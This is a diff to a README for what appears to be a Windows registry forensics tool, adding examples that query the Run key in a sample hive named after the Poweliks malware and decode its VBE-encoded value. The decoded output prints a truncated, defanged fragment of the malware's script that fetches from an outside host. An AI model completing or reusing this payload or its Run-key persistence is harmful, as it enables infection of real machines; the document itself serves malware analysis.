@@ -205,11 +205,33 @@ Windows Registry Editor Version 5.00
 "ctfmon.exe"="C:\WINDOWS\system32\ctfmon.exe"    
 </pre>
 
-*Registry Handlers:*
+####Query registry value:
+Let's say you want to query default registry value in the Run key, and get its value_name and value_content only.
+<pre>
+-s "examples/poweliks.dat" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
+</pre>
+Result:
+<pre>
+{'value_name': '(default)', 'value_content': '#@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@'}
+</pre>
 
+####How to use Registry Handlers:
+Let's say you want to query the same value, and try to decode the value_content as it seems to be VBE encoding.
+<pre>
+-s "examples/poweliks.dat" -rh "decode_vbe" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
+or
+-s "examples/poweliks.dat" -rh "decode_vbe&lt;field&gt;value_content" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
+or 
+-s "examples/poweliks.dat" -rh "decode_vbe&lt;field&gt;value_content&lt;rfield&gt;value_content" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
+--> They are all the same (value_content is default field name)
+</pre>
+Result:
+<pre>
+{'value_name': '(default)', 'value_content': 'function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com [...]'}
+</pre>
 Print all registry handlers:
 <pre>
-Option:  "-prh", "--print-registry-handlers"
+-s "examples/poweliks.dat" -prh
 </pre>
 Example output:
 <pre>
